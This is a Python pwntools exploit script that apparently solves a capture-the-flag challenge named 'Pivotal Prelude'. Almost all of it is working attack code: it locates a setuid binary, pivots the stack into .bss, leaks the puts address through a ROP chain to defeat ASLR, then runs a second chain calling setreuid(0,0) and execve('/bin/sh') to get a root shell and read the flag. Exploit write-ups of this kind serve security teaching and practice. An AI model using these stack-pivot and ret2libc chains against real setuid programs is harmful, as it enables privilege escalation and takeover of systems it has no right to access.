# Pivotal Prelude
import pwn

pwn.context.update(arch="amd64", os="linux", terminal=["tmux", "new-window"])


def tee[T: pwn.tube](process: T) -> T:
    import sys

    orig_recv_raw = process.recv_raw
    output = sys.__stdout__.buffer  # type: ignore sys.stdout is replaced by pwn.term

    def recv_raw(numb, *args, **kwargs):
        data = orig_recv_raw(numb, *args, **kwargs) or b""  # orig may return str('')
        output.write(data)
        output.flush()
        return data

    process.recv_raw = recv_raw
    return process


def find_challenge(search_path="/challenge"):
    import os
    import stat
    from pathlib import Path

    xs = [
        str(f.absolute())
        for f in Path(search_path).iterdir()
        if f.is_file() and os.access(f, os.X_OK) and (f.stat().st_mode & stat.S_ISUID)
    ]
    if not xs:
        raise FileNotFoundError(f"No executable found in {search_path}")
    if len(xs) > 1:
        raise FileNotFoundError(f"Multiple executables found in {search_path}")
    return xs[0]

# pivotal-prelude
bin = find_challenge()
elf = pwn.ELF(bin, checksec=False)
input_bss = elf.symbols["data"] + 0x10000  # input buffer
stack_gap = 0x40
stack_bss = input_bss + stack_gap  # our fake stack

io = pwn.process(bin)
tee(io)

pivot = pwn.ROP(elf)
pivot.migrate(stack_bss)
assert len(pivot.chain()) <= stack_gap

rop = pwn.ROP(elf)
rop.call("puts", [elf.got["puts"]])
rop.call(elf.symbols["challenge"])

payload = pwn.flat({0x00: pivot, stack_gap: rop})
io.sendline(payload)
io.recvuntil(b"Leaving!\n")

leak_puts_addr = pwn.u64(io.recv(6).ljust(8, b"\0"))
pwn.info(f"leaked puts address: {hex(leak_puts_addr)}")
assert elf.libc
libc = elf.libc
libc.address = leak_puts_addr - libc.symbols["puts"]

rop = pwn.ROP(libc)
rop.call("setreuid", [0, 0])
rop.call("execve", [next(libc.search(b"/bin/sh\x00")), 0, 0])

payload = pwn.flat({0x00: pivot, stack_gap: rop})
io.sendline(payload)
io.sendline(b"cat /flag; exit")

io.recvrepeat()
